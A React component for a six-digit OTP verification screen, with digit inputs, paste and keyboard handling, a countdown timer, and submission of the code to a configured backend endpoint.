import { useEffect, useRef, useState } from "react";
import "../App.css";
import "../styles/otp.css";
import axios from "axios";
import BASE_URL from "../components/urls";
import { useNavigate } from "react-router-dom";
const Otp = () => {
  const [digits, setDigits] = useState(Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [timer, setTimer] = useState(120);
  const inputsRef = useRef([]);
 const navigate = useNavigate();
  useEffect(() => {
    const id = setInterval(() => {
      setTimer((t) => (t > 0 ? t - 1 : 0));
    }, 1000);
    return () => clearInterval(id);
  }, []);

  const focusIndex = (i) => {
    const el = inputsRef.current[i];
    if (el) el.focus();
  };

  const handleChange = (index, value) => {
    if (!/\d/.test(value)) return;
    const v = value.slice(-1);
    const next = [...digits];
    next[index] = v;
    setDigits(next);
    if (index < 5 && v) focusIndex(index + 1);
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace") {
      if (digits[index]) {
        const next = [...digits];
        next[index] = "";
        setDigits(next);
      } else if (index > 0) {
        focusIndex(index - 1);
      }
    }
    if (e.key === "ArrowLeft" && index > 0) focusIndex(index - 1);
    if (e.key === "ArrowRight" && index < 5) focusIndex(index + 1);
    if (e.key === "Enter") submitOtp();
  };

  const handlePaste = (e) => {
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!text) return;
    const next = Array(6)
      .fill("")
      .map((_, i) => text[i] || "");
    setDigits(next);
    const lastFilled = Math.min(text.length, 6) - 1;
    if (lastFilled >= 0) focusIndex(lastFilled);
    e.preventDefault();
  };

  const submitOtp = () => {
    const otp = digits.join("");
    if (otp.length !== 6) return;
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, { otp })
      .then((response) => {
        console.log(response.data);
        setDigits(Array(6).fill(""));
        setTimer(120);
           navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  const mm = String(Math.floor(timer / 60)).padStart(2, "0");
  const ss = String(timer % 60).padStart(2, "0");

  return (
    <div className="otp-screen">
      <div className="container">
        <div className="contentSec">
          <div className="otp-header">
            <div className="Otptitle">OTP Verification</div>
          </div>
          <span className="OtpsubTitle">Please enter the OTP you received</span>
        </div>
        <div className="formSec">
          <div className="formPin" onPaste={handlePaste}>
            {digits.map((d, index) => (
              <input
                key={index}
                ref={(el) => (inputsRef.current[index] = el)}
                id={`otp-${index}`}
                type="text"
                maxLength="1"
                value={d}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onFocus={(e) => e.target.select()}
                className="pin-input"
                inputMode="numeric"
                pattern="\d*"
              />
            ))}
          </div>

          <div className="otp-actions">
            <button
              className="resend-btn"
              disabled={timer > 0}
              onClick={() => setTimer(120)}
            >
              RESEND OTP
            </button>
            <span className="otp-timer">
              {mm}:{ss}
            </span>
          </div>

          <div className="buttonSec">
            <button
              type="button"
              className="otpSubmitBtn"
              onClick={submitOtp}
              disabled={loading || digits.join("").length !== 6}
            >
              {loading ? "Loading..." : "Submit"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Otp;

